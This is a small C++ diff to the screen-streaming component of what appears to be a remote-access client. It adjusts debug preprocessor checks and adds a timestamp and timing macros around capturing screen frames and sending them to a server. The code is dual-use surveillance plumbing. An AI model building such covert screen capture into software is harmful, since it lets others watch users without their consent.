@@ -349,7 +349,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
                 if (frames == ++c1) { // 连续一定次数耗时长
                     s0 = (s0 <= sleep*4) ? s0*alpha : s0;
                     c1 = 0;
-#ifdef _DEBUG
+#if _DEBUG
                     if (1000./s0>1.0)
                         Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
@@ -359,7 +359,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
                 if (frames == ++c2) { // 连续一定次数耗时短
                     s0 = (s0 >= sleep/4) ? s0/alpha : s0;
                     c2 = 0;
-#ifdef _DEBUG
+#if _DEBUG
                     if (1000./s0<20.0)
                         Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
@@ -457,7 +457,7 @@ VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
     switch(szBuffer[0]) {
     case COMMAND_BYE: {
-        Mprintf("[CScreenManager] Received BYE\n");
+        Mprintf("[CScreenManager] Received BYE: %s\n", ToPekingTimeAsString(0).c_str());
         m_bIsWorking = FALSE;
         m_ClientObject->StopRunning();
         break;
@@ -634,6 +634,7 @@ VOID CScreenManager::SendFirstScreen()
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 {
+    AUTO_TICK(100, "GetNextScreen");
     LPVOID	NextScreenData = m_ScreenSpyObject->GetNextScreenData(&ulNextSendLength);
 
     if (ulNextSendLength == 0 || NextScreenData == NULL) {
@@ -645,6 +646,7 @@ const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 
 VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
 {
+    AUTO_TICK(100, std::to_string(ulNextSendLength));
     m_ClientObject->Send2Server(szBuffer, ulNextSendLength);
 }
 
